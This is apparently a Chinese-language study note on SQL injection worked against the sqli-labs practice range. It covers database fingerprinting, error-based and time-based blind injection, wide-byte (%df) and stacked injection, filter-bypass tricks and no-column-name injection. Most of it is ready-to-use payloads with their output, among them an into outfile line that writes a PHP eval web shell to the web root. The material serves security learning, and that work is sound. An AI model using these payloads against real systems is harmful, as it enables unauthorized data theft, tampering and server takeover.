## 读写文件
- 读文件用`load_file()`函数(读取文件依赖于my.ini配置文件里的`secure-file-priv`如果`secure-file-priv`为空的话，就可以读取外部任意文件。默认只可以读取MySQL/MySQL Server 8.0/Uploads"里的。)
```
select load_file("D:\\MySQL\\MySQL Server 8.0\\Uploads\\flag.txt") as file_content;
```
- 写文件用`into outfile` 
```
select 1,'<?php @eval($_POST[cmd]);phpinfo();?>',3 into outfile "/var/www/html/shell.php"
或者
select 1,load_file("/var/www/html/flag.txt"),3 into outfile "/var/www/html/shell.php"
这样可以达到修改文件后缀的效果，当成php解析
也可以
?id=1' union select 1,“”,3 into dumpfile ‘C:\phpstudy\WWW\sqli\shell.php'# 
outfile可以写入多行数据，并且字段和行终止符都可以作为格式输出。  
dumpfile只能写一行，并且输出中不存在任何格式。
```
## 判断数据库类型
### 通过特定的sql语句

#### MySQL的特定语句
MySQL是最广泛使用的数据库之一，其特定的语句包括但不限于`SELECT VERSION()`、`SELECT DATABASE()`。通过这些查询，我们可以获取数据库的版本和名称。例如：
```sql
SELECT VERSION();
```
如果返回一个版本号，比如`5.7.31`，那么可以确定这是一个MySQL数据库。此外，MySQL支持许多特有的函数，比如`CONCAT()`，我们可以利用这些函数来进一步确认。
#### PostgreSQL特定语句
例如
```sql
SELECT VERSION();
```
如果返回结果类似于`PostgreSQL 12.4`, 那么可以确定这是一个PostgreSQL数据库。另一个常用的方法是使用`SELECT current_database();`来获取当前数据库的名称。
#### SQL Server的特定语句
例如
```sql
SELECT @@VERSION;
```
返回结果会是类似于`Microsoft SQL Server 2019`的字符串。SQL Server特有的函数如`LEN()`、`GETDATE()`也可以帮助进一步确认。
#### Oracle的特定语句
```sql
SELECT * FROM v$version;
```
返回结果通常会包含`Oracle Database`的字样。我们也可以使用`SELECT banner FROM v$version;`来获取更详细的信息。
#### SQLite的特定语句
```sql
SELECT sqlite_version();
```
返回结果会是类似于`3.32.3`的版本号。此外，SQLite中的`PRAGMA`命令也能用于识别数据库类型。
### 观察错误信息
#### 错误信息的差异
不同数据库在处理错误时会返回不同的信息，这些信息可以帮助我们识别数据库类型。例如，MySQL的错误信息通常包含`MySQL`字样，而SQL Server的错误信息则会包含`SQL Server`字样。
#### 如何触发错误
通过故意输入错误的SQL语句，我们可以诱导数据库返回错误信息。例如，输入一个不存在的表名或字段名：
```sql
SELECT * FROM nonexistent_table;
```
通过观察返回的错误信息中的关键字，可以推断出数据库的类型。
### 利用数据库特有函数
#### MySQL特有函数
MySQL有许多特有的函数，比如`CONCAT()`、`GROUP_CONCAT()`等。通过执行这些函数，我们可以进一步确认数据库类型。例如：
```sql
SELECT CONCAT('A', 'B');
```
如果返回结果为`AB`，那么可以确定这是一个MySQL数据库。
#### PostgreSQL特有函数
PostgreSQL特有的函数包括`STRING_AGG()`、`ARRAY_TO_STRING()`等。我们可以通过执行这些函数来确认数据库类型。例如：
```sql
SELECT STRING_AGG('A', 'B');
```
如果返回结果为`AB`，那么可以确定这是一个PostgreSQL数据库。
#### SQL Server特有函数
SQL Server有许多特有的函数，比如`LEN()`、`GETDATE()`等。通过执行这些函数，我们可以进一步确认数据库类型。例如：
```sql
SELECT LEN('ABC');
```
如果返回结果为`3`，那么可以确定这是一个SQL Server数据库。
#### Oracle特有函数
Oracle数据库有许多特有的函数，比如`TO_CHAR()`、`TO_DATE()`等。通过执行这些函数，我们可以进一步确认数据库类型。例如：
```sql
SELECT TO_CHAR(SYSDATE, 'YYYY-MM-DD');
```
如果返回结果为当前日期的字符串，那么可以确定这是一个Oracle数据库。
#### SQLite特有函数
SQLite也有一些特有的函数，比如`DATE()`、`TIME()`等。通过执行这些函数，我们可以进一步确认数据库类型。例如：
```sql
SELECT DATE('now');
```
如果返回结果为当前日期，那么可以确定这是一个SQLite数据库。
### 利用工具
#### SQLMap
SQLMap是一款开源的SQL注入工具，可以自动化检测和利用SQL注入漏洞。它可以自动识别数据库类型，并提供进一步的攻击选项。例如：
```bash
sqlmap -u "http://example.com/vulnerable_page?id=1" --dbms=mysql
```
通过这种方式，我们可以快速识别数据库类型并进行后续操作。
### 根据端口判断
**Oracle**：默认端口1521  
**SQL Server**：默认端口1433  
**MySQL**：默认端口3306
### 根据数据库特有的数据表判断
#### MySQL（version>5.0）
```
http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)>0 and 1=1
```
#### Oracle
```
http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)>0 and 1=1
```
#### SQL Server
```
http://127.0.0.1/test.php?id=1 and (select count(*) from sys.objects)>0 and 1=1
```
#### PostgreSQL
```
http://127.0.0.1/test.php?id=1 and (select count(*) from pg_tables)>0 and 1=1
```
#### SQLite
```
http://127.0.0.1/test.php?id=1 and (SELECT COUNT(*) FROM sqlite_master) > 0
```
### 盲注判断
如果是布尔盲注的话，用上面的一些方法还是可以的，但是如果是时间盲注的话，就必须要用盲注特别函数判断了。
#### MySQL
```
AND IF((SELECT COUNT(*) FROM information_schema.tables)>0,BENCHMARK(1000000,SHA1(1)),0)
AND IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)
```
#### PostgreSQL
```
PG_SLEEP(5)
GENERATE_SERIES(1,1000000)
```
#### SQL Server
```
AND IF((SELECT COUNT(*) FROM sys.objects)>0,WAITFOR DELAY '00:00:05',0)
```
#### Oracle
```
AND (CASE WHEN (SELECT 1 FROM dual)=1 THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)
```
mysql和sqlite都有sleep()函数，这样就只有猜测了，先执行`sqlite_version()`试一下，如果可以就是sqlite。
## 报错注入
原理：利用某些**函数报错**会返回参数值的这一个特点，通过触发数据库错误来获取数据库的详细信息。攻击者利用这个特点向服务器传递恶意的代码，返回自己想看到的内容。
常见报错函数
```
updatexml函数，extractvalue函数，floor()函数,NAME_CONST()函数,join()函数,exp()函数
```
#### updatexml()函数
原理：`updatexml`函数用于对XML数据进行更新。它接受三个参数：一个XML字符串、一个XPath表达式和一个新的值。如果XPath表达式无效或XML格式错误，`updatexml`会返回错误信息。
```
UPDATEXML(xml_doc, xpath_expr, new_xml)
```
例如
```
-1' and updatexml(1,concat('~',(select database()),'~'),1)#
或者
-1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
`1` 是XML文档的占位符，这里实际并不关心这个值是什么，因为重点在于触发错误。
`CONCAT('~', (SELECT version()), '~')` 是一个字符串拼接函数，它将三个部分拼接在一起：
`~`：一个波浪号，用于标记字符串的开始。
重要的是第二个参数，必须是符合 XPath 1.0 规范的合法路径表达式（如`/root/node`、`//book`等，仅允许包含`/`、字母、数字、下划线等合法字符）；
而~不合法会报错并回显报错内容，就把select database()执行并回显了。
```
#### extractvalue()函数
原理与updatexml()类似。
```
EXTRACTVALUE(xml_doc, xpath_expr)
```
只比updatexml()少一个参数
例如
```
-1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```
#### floor()函数
原理：`floor`函数用于返回小于或等于指定数值的最大整数。如果输入值是一个表达式并包含随机数生成函数（如`rand`），则在某些情况下会生成重复的值，从而触发错误。
rand()可以生成一个0-1间的随机数。
```
1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+
其中floor(rand(0)*2)的结果只可能是0或1
`COUNT(*)` 函数用于统计表中的记录数。这里用于统计 `information_schema.tables` 表中的记录数。
所以最终生成的是 ~数据库名~0或 ~数据库名~1
x 为生成的字符串起一个别名。
group by x 按照 `x` 列（即拼接后的字符串）对结果进行分组。
```
- `GROUP BY x`按照拼接后的字符串对结果进行分组。如果`information_schema.tables`表中有足够多的行，`FLOOR(RAND(0)*2)`生成的随机数会导致某些组中有重复的键，从而触发重复键错误。
- 由于 MySQL 返回的错误信息包含生成的字符串，攻击者可以在错误信息中看到数据库的名称。
#### name_const()函数
原理：`name_const`函数用于为一个常量值指定一个名称。如果在SQL查询中重复使用相同的名称，则会触发错误。
```
NAME_CONST(const_name, const_value)
```
例如
```
1' AND (SELECT * FROM (SELECT NAME_CONST(version(), 1), NAME_CONST(version(), 1)) AS x)--+
`NAME_CONST(version(), 1)` 会把 `version()` 的结果（例如 `8.0.42`）作为列的名字。
在一个子查询里写了两个一样的 `NAME_CONST`，MySQL 就会尝试创建两列，名字都叫 `8.0.42`
MySQL 无法处理重复的列名，报错信息会类似于ERROR 1060 (42S21): Duplicate column name '5.7.26'
这样就可以带出结果
```
#### join函数
原理：SQL中的`JOIN`操作用于在多个表之间建立关联。如果在`JOIN`操作中构造错误的查询语句，也可以触发错误信息。
```
SELECT * FROM users u JOIN (SELECT 1 AS a, (SELECT version()) AS b) t ON u.id = t.a;
SELECT * FROM users u 从 `users` 表中检索所有列，并给该表分配一个别名 `u`。
JOIN (SELECT 1 AS a, (SELECT database()) AS b) t 进行一个 JOIN 操作，连接 `users` 表和一个子查询。
子查询 `(SELECT 1 AS a, (SELECT database()) AS b)` 返回两列： - `1`：作为列 `a` 的值。 - `(SELECT database())`：作为列 `b` 的值，返回当前使用的数据库名称。 将子查询的结果作为一个临时表 `t`。
ON u.id = t.a 指定 JOIN 条件，将 `users` 表中的 `id` 列与临时表 `t` 中的 `a` 列进行匹配。 由于 `t.a` 的值始终为 `1`，因此只会匹配 `users` 表中 `id` 等于 `1` 的记录。
```
- 由于`t.a`的值始终为`1`，只有`users`表中`id`等于`1`的记录会被匹配并返回。
或者
```
SELECT * FROM (SELECT * FROM users AS a JOIN users AS b) AS c;
这样会报错把-- 报错：Duplicate column name 'id'
SELECT * FROM (SELECT * FROM users AS a JOIN users AS b USING(id)) AS c;
利用 `USING` 排除已知的 `id`
报错ERROR 1060 (42S21): Duplicate column name 'username'
SELECT * FROM (SELECT * FROM users AS a JOIN users AS b USING(id, username)) AS c;
排除 `id` 和 `username`
报错 ERROR 1060 (42S21): Duplicate column name 'password'
```
#### exp()函数
原理：`exp`函数用于计算e的指定次方。如果输入值导致数学错误（如无限大或NaN），则会触发错误。
在 MySQL 中，`EXP(x)` 函数的作用是计算 $e^x$。当输入的数值 $x$ 超过一定范围（通常大于 **709**）时，计算结果会超出双精度浮点数能表示的最大范围，从而引发溢出错误。
你可以通过对查询结果进行按位取反（`~`）操作，来得到一个非常大的数字，强制诱发溢出：
例如
```
1' AND (SELECT EXP(~(SELECT * FROM (SELECT version()) AS x)))--+
会报错
DOUBLE value is out of range in 'exp(~((select '5.5.44-0ubuntu0.14.04.1' from dual)))'带出执行结果
`~` (按位取反): 这是一个关键步骤。对字符串或较小的数字进行取反操作，会产生一个巨大的整数
`EXP(...)`: 当 `EXP()` 尝试计算 e 的这个巨大次方时，由于数值太大，MySQL 会直接抛出错误。
```
## 时间盲注
时间盲注又称延迟注入，当页面不会返回错误信息，只会回显一种界面的时候，可以根据页面返回的时间来进行注入。其主要特征是利用sleep函数，制造时间延迟，由回显时间来判断是否报错。
函数
```
sleep(),benchmark(),笛卡尔积,GET_LOCK(), RLIKE正则
```
#### sleep()函数
```
1' and if(substr((select database()),1,1)='s',sleep(2),1)--+
```
根据这个原理可以一个一个字符把结果爆出来。
#### benchmark()函数
```
benchmark(执行次数,表达式)
```
`benchmark()`函数执行指定的表达式多次，消耗CPU资源，用于制造计算延迟。
```
1' and if(substr((select database()),1,1)='s',benchmark(1000000,SHA1(1)),1)--+
```
执行100000次SHA1(1)，可以卡住大概1秒。
#### 笛卡尔积
在 SQL 中，如果你执行 `SELECT * FROM table1, table2` 而不写 `WHERE` 条件，数据库会将 `table1` 的每一行与 `table2` 的每一行进行组合。
- 如果 `table1` 有 1,000 行，`table2` 也有 1,000 行，结果就是 1,000,000 行。
- 如果你连接 5 个这样的表，结果会呈几何倍数爆炸（$1000^5$），这会导致数据库处理极其缓慢，从而达到类似 `SLEEP()` 函数的效果。
```
1' AND (SELECT IF((substr(database(),1,1)='s'),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),0))--+

如果IF((substr(database(),1,1)='s'成立，就执行后面的查询，如果不成立直接0，瞬间结束。
(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
如果时间太长或太短，可以减少或增多查的表的数量。
count(*)是必须要有的，作为一个聚合函数，它会强迫 MySQL 引擎实际去数一遍笛卡尔积生成的每一行。这意味着数据库必须完成所有的计算逻辑，从而确保产生你预期的“时间延迟”。
```
#### GET_LOCK()函数
原理：`GET_LOCK()`函数尝试获取指定名称的锁，如果锁可用则返回成功并持有锁指定时间。
```
GET_LOCK(str, timeout)
```
该函数尝试获取一个名为 `str` 的锁，持续时间为 `timeout` 秒,**成功获取**：返回 `1`**获取超时**：如果在 `timeout` 秒内没拿到锁，返回 `0`。
在同一个会话（Session）中，如果你已经持有一个锁，再次申请同一个锁通常会直接成功；但如果**另一个不同的连接**已经持有了这个锁，你的当前连接就会被强行阻塞，直到超时。
这也就意味着你必须可以开启两个不同的数据库连接，或者知道已被占有的锁。
在本地实验的话，可以用控制台连接数据库。执行`SELECT GET_LOCK('lock1', 100);`来占有`lock1`这个锁100秒。
再另一个连接数据库
```
1' AND (SELECT IF((substr(database(),1,1)='s'),GET_LOCK('lock1', 5),1))--+
连接lock1锁，就会连接不上导致超时。
```
#### RLIKE正则
原理：通过正则表达式匹配制造复杂的计算延迟。
在正则表达式中，如果使用嵌套的重复匹配（如 `(a+)+b`），当面对一个长字符串且匹配失败时，正则引擎会尝试所有可能的组合路径。这种指数级的尝试过程会极大地消耗 CPU 时间，导致查询响应变慢。
```
SELECT * FROM users WHERE id = 1 AND (
    SELECT IF(
        (substr(version(), 1, 1) = 8), 
        (RPAD('a', 1000000, 'a') RLIKE '(a+)+b'), 
        1
    )
);
```
- 如果条件为真，MySQL 开始执行 `RLIKE` 密集计算，页面会出现几秒钟的“转圈”延迟。
- **快速返回**：如果条件为假，MySQL 返回 `1`，页面瞬间加载完成。
#### ascii过滤
虽然盲注完全可以不用ascii和二分法，但是如果必须要用，就得有代替方法
**ord()**
这个函数与ascii()函数完全等效。
**hex()**
转十六进制，再转回来就可以了。
**bin()**
转二进制
## 宽字节注入
主要用到php的addslashes()函数。
`addslashes()`是 PHP 中用于转义字符串中的特殊字符的函数之一。它会在指定的预定义字符（单引号、双引号、反斜线和 NUL 字符）前面添加反斜杠，以防止这些字符被误解为代码注入或其他意外操作。
```php
<?php 
$input = "O'Reilly"; 
$safe_input = addslashes($input); 
echo $safe_input; // 输出 O\'Reilly 
$input = 'He said "Hello"'; 
$safe_input = addslashes($input); 
echo $safe_input; // 输出 He said \"Hello\" 
$input = "Backslash: \\"; 
$safe_input = addslashes($input); 
echo $safe_input; // 输出 Backslash: \\ 
?>
```
原理：在网站开发中，防范SQL注入是至关重要的安全措施之一。常见的防御手段之一是使用PHP函数 addslashes() 来转义特殊字符，如单引号、双引号、反斜线和NULL字符。
然而，宽字节注入攻击利用了这种转义机制的漏洞，通过特殊构造的宽字节字符绕过 addslashes() 函数的转义，从而实现对系统的攻击。
攻击者利用宽字节字符集（**GBK**）**将两个字节识别为一个汉字**，绕过反斜线转义机制，并使单引号逃逸，实现对数据库查询语句的篡改。
由于PHP utf-8编码 数据库GBK编码，PHP发送请求到mysql时经过一次gbk编码，因为GBK是双字节编码，所以我们提交的%df这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后单引号就逃逸了出来
靶场第三十二关
```php
function check_addslashes($string)

{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                              //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
    return $string;
}
```
这是手写了一个和`addslashes`功能一样的函数。
例如
```
输入payload: ' or 1=1 # 经过 addslashes() 后：\' or 1=1 #
'的url编码是`%27`，经过`addslashes()`以后，`'`就变成了`\'`，反斜杠（`\`）的URL编码是`%5C`。`\'`对应的url编码就是`%5c%27`
构造绕过payload： %df' or 1=1 
# 经过 addslashes() 后： %df\' or 1=1 
# 在数据库中执行：雅'or 1=1 #
```
分析：我们在payload中的`'`之前加了一个字符`%df`，经过`addslashes()`以后，`%df'`就变成了`%df\'`，对应的URL编码为：`%df%5c%27`。 **当MySQL使用GBK编码时，会将`%df%5c`解析成一个字**，从而使得单引号`%27`成功逃逸。
`%DF%5C`：在GBK编码中，对应的是汉字“雅”。
payalod
```
汉' union select 1,database(),3--+
或者
-1%df%27 union select 1,database(),3--+
```
## 堆叠注入
堆叠注入，顾名思义，就是将语句堆叠在一起进行查询  
原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如
```
select * from users;show databases;
```
`mysqli_query()`是 PHP 中用于执行单条 MySQL 查询的函数。
`mysqli_multi_query()`是 PHP 中用于执行多条 MySQL 查询的函数。
但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。
靶场38关。
```
?id=1';insert into users(id,username,password) values ('100','100','100')--+
```
这样可以直接执行任何指令了，包括写入数据，十分危险。
## 过滤绕过
实例语句
```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```
#### 过滤空格
使用内联注释`/**/`代替空格。
```
-1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='security'--+
```
使用括号包裹
```
-1'union(select(1),2,group_concat(table_name)from(information_schema.tables)where(table_schema='security'))--+
```
使用反引号包裹变量名
```
-1'union(select(1),2,group_concat(table_name)from`information_schema`.`tables`where`table_schema`='security')--+
```
符号代替空格的方式(urlencode)
```
%0D Carriage Return，回车 代替空格  
%0A Line Feed，换行 代替空格  
%0C Form Feed，换页 代替空格  
%09 Horizontal Tab，水平制表 代替空格  
%0B Vertical Tab，垂直制表 代替空格  
%A0 Non-breaking space (MySQL only)，不间断空格 代替空格
```
例如
```
-1'%0aunion%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'--+
```
#### 过滤引号
一般当引号被过滤就会在引号前加一个\，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，\的url是%27我们在引号前写上%df，那么%df%27构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是%df只要在那个字符集的范围内都可以。如%bf%27 %df%27 %aa%27
同时查询用户名和密码的情况下，
```sql
SELECT username FROM users WHERE id='1\' AND passwd=' UNION SELECT 1,2,3--' 
```
payload
```
id=1\&passwd=UNION SELECT 1,2,3--
```
这样第二个引号就转义了所以查询语句会变成上面那样。
也可以把需要引号闭合的字符串十六进制编码，这样就可以不用引号了。
#### 过滤逗号
使用join
```
-1'union select 1,2,3--+ 
```
可以写成
```
-1'union (select * from(select 1)a join (select 2)b join (select 3)c)--+
```
盲注常用的 `substring()` `substr()` `mid()` 中,  
会用到逗号 可以使用 from for 代替:
```
SELECT SUBSTRING(DATABASE() FROM 1 FOR 1);  
SELECT SUBSTR(DATABASE() FROM 1 FOR 1);  
SELECT MID(DATABASE() FROM 1 FOR 1);
```
limit语法也要用到逗号,可以用offset代替
```
SELECT * FROM users LIMIT 1 OFFSET 0;
同
SELECT * FROM users LIMIT 0,1;
```
盲注中也可以使用模糊查询的方法来避免使用逗号:
```
SELECT DATABASE() LIKE 's%'
/*
等价于 SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))=115;

s% 是一个模式字符串，其中 % 是通配符
% 表示任意数量的字符（包括零个字符）
s% 匹配所有以 s 开头的字符串，不论其后有多少字符
*/
这样就可以一个一个字母试了
```
LIKE 支持以下通配符：
- %：匹配零个或多个字符。
- `_`：匹配单个字符。
```
LIKE 'u%'：匹配以 u 开头的所有字符串。  
LIKE '%123'：匹配以 123 结尾的所有字符串。  
LIKE '_b%'：匹配第二个字符是 b 的所有字符串（如 ab123、cb_test）。  
LIKE 't__t'：匹配 t 开头、接两个字符、然后是 t 的字符串（如 test）
```
#### 过滤比较符
过滤`>`和`<`时`=`，可以使用`greatest()`和`least()`函数。
当然`=`也可以直接用`like`代替
分别返回最大值和最小值
```
select greatest(1,2,3,5,7,9);
返回9
select least(1,2,3,5,7,9);
返回1
```
也可以用`between a and b`表示在a和b之间。
例如
```
-1' or substr((select database()),1,1) between 'r' and 't'--+
```
利用between，greatest()和least()也可以绕过等号
```
-1' or substr((select database()),1,1) between 's' and 's'--+
等价于
-1' or substr((select database()),1,1)='s'--+
```
用`rlike`判断某个字段的值是否匹配指定的正则表达式，  
它是`regexp`的同义词  
用`regexp`匹配字符串中是否包含符合正则规则的部分,  
默认不区分大小写,
如果需要区分，可以使用`binary`:
```sql
SELECT 'abc' REGEXP 'A';       -- 返回 1  
SELECT BINARY 'abc' REGEXP 'A'; -- 返回 0  
  
SELECT BINARY DATABASE() REGEXP '^s';
```
函数`strcmp(str1,str2)`
```
str1 = str2 -> 0
str1 < str2 -> -1
str1 > str2 -> 1
```
可以用`in`语法。
用于判断某个值是否在指定集合中的条件操作符:
```
-- 是则返回 1,否则返回 0
SELECT ASCII(SUBSTRING(DATABASE(), 1, 1)) IN (115);
```
用`<>`表示不等于
```
SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))<>114;
```
#### 过滤逻辑运算符
```
and &&
or ||
not !
xor |
```
#### 过滤if
逻辑中断`or ||`
只需一个表达式为真，整个表达式就为真。  
那么很多时候程序只判断到前一个表达式为真时，  
就忽略后一个表达式不执行，`MySQL`就具备这个特性。  
可以利用它达到条件判断的效果:
```sql
-- 假设 database 为 "security"  
-- 它不会执行 SLEEP，因为前一个表达式为真  
SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))=115 || SLEEP(1);  
  
-- 它会执行 SLEEP，因为前一个表达式为假，程序还需要判断后一个表达式才能确定整个表达式的值  
SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))=114 || SLEEP(1);
```
使用`locate(str1,str2)`
比较输入的两个字符串， 
第一个参数是参照物，第二个参数是参照对象，  
该函数会判断参照对象中是否含有参照物，  
若不含有，则返回 0；  
若含有，则返回该参照物在参照对象中的位置:
用`case when...then...else...end`
```sql
CASE WHEN condition THEN result1 ELSE result2 END  
  
-- 1  
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;  
  
-- 2  
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END;
```
用`elt(N, str1, str2, ..., strN)`  
从一个字符串列表中返回对应位置的字符串  
假设有一张表 my_table，  
包含字段 id 和 category，  
我们希望根据 category 的值返回对应字符串：
```sql
SELECT id, ELT(category, 'Electronics', 'Books', 'Clothing')
AS category_name
FROM my_table;
```
如果 category 的值为 1、2 或 3，  
分别返回 Electronics、Books、Clothing
这个函数同样可以用在盲注中,  
逻辑运算往往会返回 0 或 1，  
也就是说可以让条件为真时,  
执行`elt`函数第二个参数的表达式
```
-- 条件为真时会睡 3 秒  
SELECT ELT((LENGTH(DATABASE())>3), SLEEP(3));
```
#### 过滤关键字
如果单纯替换为空，就双写绕过
```
select -> selselectect
```
如果过滤不区分大小写，就用随便换
```
select -> SELECT -> sElEct
```
如果过滤关键词组合`union select`可以改用`union all select`
或者结合内联注释构造: `/*!UNION*/SELECT UNION/**/SELECT`  
或者插入其他可代替空格的符号
#### 过滤information_schema
information_schema,它是一个系统数据库，存储了MySQL服务器中所有其他数据库的元数据信息。提供对数据库、表、列、索引等元数据的访问，帮助我们了解数据库结构。很幸运在mysql 5.7以后新增了schema_auto_increment_columns这个视图去保存所有表中含有自增字段的信息。不仅保存了库名、表名还保存了自增字段的列名
先看一下有哪些库
```
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
有
information_schema,challenges,mysql,performance_schema,security,sys,upload-labs
```
这里的sys下有一个`sys.schema_auto_increment_columns`
当我们利用database（）函数获得数据库名之后,可以利用这个视图去获得表名和列名
```
select table_name,column_name from sys.schema_auto_increment_columns where table_schema = "security";
-1' union select 1,2,group_concat(table_name,column_name) from sys.schema_auto_increment_columns where table_schema='security'--+
```
这样可以直接获得表名和列名。
```
+------------+-------------+
| table_name | column_name |
+------------+-------------+
| uagents    | id          |
| referers   | id          |
| users      | id          |
| emails     | id          |
+------------+-------------+
```
还可以利用`schema_table_statistics`
而对于没有自增列的表名，这个视图是无法获取的。这个时候我们可以通过统计信息视图获得表名
`schema_table_statistics_with_buffer`
`schema_table_statistics`
```
select table_name from sys.schema_table_statistics_with_buffer where table_schema = "security";
select table_name from sys.schema_table_statistics where table_schema = "security";
-1' union select 1,2,group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema='security'--+
```
但是这个好像只可以查表名，不可以查列名。
会报错`ERROR 1054 (42S22): Unknown column 'column_name' in 'field list'`
但还有办法获得列名，这里就需要用到无列名注入。
`join...using`
```
-1' union all select * from (select * from users as a join users as b)as c--+
回显Duplicate column name 'id'
这个报错 `Duplicate column name 'id'` 是因为在 `JOIN` 查询中没有指定具体的列，导致结果集中出现了两个同名的 `id` 列（一个来自表 `a`，一个来自表 `b`）。数据库在尝试创建派生表 `c` 时，由于无法处理重复的列名，直接把冲突的列名吐了出来。 
-1' union select * from (select * from users as a join users as b using(id,username,password))as c--+
select * from users where id='0' union all select * from (select * from users as a join users as b)as c;
select * from users where id='0' union all select * from (select * from users as a join users as b using(id,username,password))as c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
```
**order by盲注**
order by用于根据指定的列对结果集进行排序。一般上是从0-9、a-z排序，不区分大小写。
```
 select * from users where id='1' union select 1,2,'c' order by 3;
select * from users where id='1' union select 1,2,'d' order by 3; 
 select * from users where id='1' union select 1,2,'e' order by 3; 
```
其中
```
1' union select 1,2,'d' order by 3--+
回显
Your Login name:2  
Your Password:d
1' union select 1,2,'e' order by 3--+
回显
Your Login name:Dumb  
Your Password:Dumb
```
测的值大于当前值时，会返回原来的数据即这里看第二列返回是否正常的username，否则会返回猜测的值。
**子查询**
子查询也能用于无列名注入，主要是结合union select联合查询构造列名再放到子查询中实现。
使用如下union联合查询，可以给当前整个查询的列分别赋予1、2、3的名字：
```
select 1,2,3 union select * from users; 
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
```
接着使用子查询就能指定查询刚刚赋予的列名对应的列内容了：
```
select `3` from (select 1,2,3 union select * from users)x;
+------------+
| 3          |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
| crappy     |
| stupidity  |
| genious    |
| mob!le     |
| admin      |
| admin1     |
| admin2     |
| admin3     |
| dumbo      |
| admin4     |
+------------+
```
#### 过滤注释符
常见注释符
```
/**/ --+ # /*!*/
```
**可以平衡引号**
例如sql-labs第23关，
```
id=1' or '1'='1
id=1' '
```
注入查询语句
```
-1' union select 1,2,database() '
-1' union select 1,database(),3 or '1'='1
```
**%00截断**
```
-1' union select 1,database(),3;%00
```
但这也只有老版本的php可以用了。从php5.3.4开始就基本不可以用了
**改变闭合方式避免语法错误**
```sql
SELECT id FROM users WHERE username='' AND passwd='' LIMIT 0,1;
```
发送payload
```
username=admin'OR&passwd=OR'
```
拼接后变成
```sql
SELECT id FROM users WHERE username='admin'OR' AND passwd='OR'' LIMIT 0,1;
```
#### 编码绕过
```
-- SELECT username FROM users;
SELECT char(117,115,101,114,110,97,109,101) FROM users;
SELECT 0x757365726e616d65 FROM users;
```
#### 花括号语法
```
SELECT {a DATABASE()};
```
花括号左边是注释（左边可以是任意字母，但不能是数字），  
右边是查询语句的一部分

## 无列名注入
**通常情况是columns被ban了或者information被ban了 等读取不到列名的情况**
上面提到了用sys的一些库可以获取表名，但是sys库需要root权限才能访问。innodb在mysql中是默认关闭的。
#### InnoDb      
从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，**但是没有存储列名**。
```
mysql.innodb_table_stats
mysql.innodb_index_stats
```
可以用来代替`information_schema.tables`查表名
例如
```
-1' union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name='security'--+
```
#### sys
在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取**表名**。
```
schema_table_statistics_with_buffer
schema_table_statistics
schema_auto_increment_columns
```
#### 设置别名来绕过列名   
union可以构造一个虚拟表。
```
select 1,2,3 union select * from users; 
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
